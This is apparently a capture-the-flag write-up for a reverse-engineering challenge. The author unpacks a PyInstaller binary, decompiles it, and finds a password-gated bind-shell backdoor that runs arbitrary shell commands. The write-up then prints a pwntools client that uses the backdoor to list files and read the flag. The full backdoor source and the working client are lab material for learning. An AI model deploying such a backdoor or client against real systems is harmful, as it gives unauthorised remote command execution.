# Backdoor

## Description

One of our friends has left a backdoor on the extraterrestrials' server. If we manage to take advantage of it, we will be able to control all the doors and lock them outside or open doors to facilites we have no access.

[rev_backdoor.zip](rev_backdoor.zip)

## Solution
 
From `pydata` ELF section and other `Py_*` constants and a little googling it is clear that `bd` is a `Pyinstaller` executable. Pyinstaller has a tool that can extract content of its archives - `pyi-archive_viewer`:

    $> pyi-archive_viewer bd
    ...
    (13756, 528, 732, 1, 's', 'bd'), 
    ...
    ? X bd
    to filename? bd.bin
    ? Q

Then we have a bytocode blob that is still not a `.pyc` file ready to be decompiled with `uncompyle6`. By [a similar challenge](https://cujo.com/first-seclounge-ctf-2020-re-and-misc-challenges/) I added the PYC header:

```python
open("bd.pyc", "wb").write(b"\x42\x0d\x0d\x0a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" + open("bd.bin", "rb").read())
```

But still cannot be decompiled due to MAGIC_NUMBER difference between my Python3 version and the `bd.pyc`. I find my MAGIC_NUMBER by:

```python
>>> import importlib.util
>>> importlib.util.MAGIC_NUMBER
b'U\r\r\n'

>>> from binascii import hexlify, unhexlify
>>> hexlify(importlib.util.MAGIC_NUMBER)
b'550d0d0a'
```

and:

![](https://i.imgur.com/LM7eOE8.png)

Then we can decompile by `uncompyle6 bd.pyc`:

```python
# uncompyle6 version 3.7.4                                                                                                             
# Python bytecode 3.8 (3413)                                                                                                           
# Decompiled from: Python 3.8.5 (default, Jan 27 2021, 15:41:15)                                                                       
# [GCC 9.3.0]
# Embedded file name: bd.py
import socket
from hashlib import md5
from subprocess import check_output
sock = socket.socket()
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind(('0.0.0.0', 4433))
sock.listen(5)
while True:
    client, addr = sock.accept()
    data = client.recv(32)
    if len(data) != 32:
        client.close()
    elif data.decode() != md5(b's4v3_th3_w0rld').hexdigest():
        client.send(b'Invalid')
        client.close()
    else:
        size = client.recv(1)
        command = client.recv(int.from_bytes(size, 'little'))
        if not command.startswith(b'command:'):
            client.close()
        else:
            command = command.replace(b'command:', b'')
            output = check_output(command, shell=True)
            client.send(output)
            client.close()

```

Then get to the service by:

```python
from pwn import *
import struct
import hashlib


def cm(c):
    cc = b"command:%s" % c
    return struct.pack("B", len(cc)) + cc


def ex(c):
    pwd = hashlib.md5(b's4v3_th3_w0rld').hexdigest().encode("ascii")
    r = remote("138.68.148.24", 30872)
    r.send(pwd)
    r.send(cm(c.encode("ascii")))
    print(r.recvall().decode("ascii"))

```

and:

```python
>>> ex("ls -al")
Opening connection to 138.68.148.24 on port 30872
[+] Opening connection to 138.68.148.24 on port 30872: Done
[+] Receiving all data: Done (1.34KB)
[*] Closed connection to 138.68.148.24 port 30872
total 72
drwxr-xr-x    1 root     root          4096 Apr 20 06:45 .
drwxr-xr-x    1 root     root          4096 Apr 20 06:45 ..
-rwxr-xr-x    1 root     root             0 Apr 20 06:45 .dockerenv
-rwxr-xr-x    1 root     root           793 Apr 16 16:37 bd.py
drwxr-xr-x    2 root     root          4096 Apr 14 10:25 bin
drwxr-xr-x    5 root     root           360 Apr 20 06:45 dev
drwxr-xr-x    1 root     root          4096 Apr 20 06:45 etc
-rw-r--r--    1 root     root            30 Apr 16 16:39 flag.txt
drwxr-xr-x    2 root     root          4096 Apr 14 10:25 home
drwxr-xr-x    1 root     root          4096 Apr 14 10:25 lib
drwxr-xr-x    5 root     root          4096 Apr 14 10:25 media
drwxr-xr-x    2 root     root          4096 Apr 14 10:25 mnt
drwxr-xr-x    2 root     root          4096 Apr 14 10:25 opt
dr-xr-xr-x  335 root     root             0 Apr 20 06:45 proc
drwx------    2 root     root          4096 Apr 14 10:25 root
drwxr-xr-x    2 root     root          4096 Apr 14 10:25 run
drwxr-xr-x    2 root     root          4096 Apr 14 10:25 sbin
drwxr-xr-x    2 root     root          4096 Apr 14 10:25 srv
dr-xr-xr-x   13 root     root             0 Apr 20 06:45 sys
drwxrwxrwt    2 root     root          4096 Apr 14 10:25 tmp
drwxr-xr-x    1 root     root          4096 Apr 16 16:39 usr
drwxr-xr-x    1 root     root          4096 Apr 14 10:25 var

>>> ex("cat flag.txt")
Opening connection to 138.68.148.24 on port 30872



[+] Opening connection to 138.68.148.24 on port 30872: Done
[+] Receiving all data: Done (30B)
[*] Closed connection to 138.68.148.24 port 30872
CHTB{b4ckd00r5_4r3_d4nG3r0u5}


```

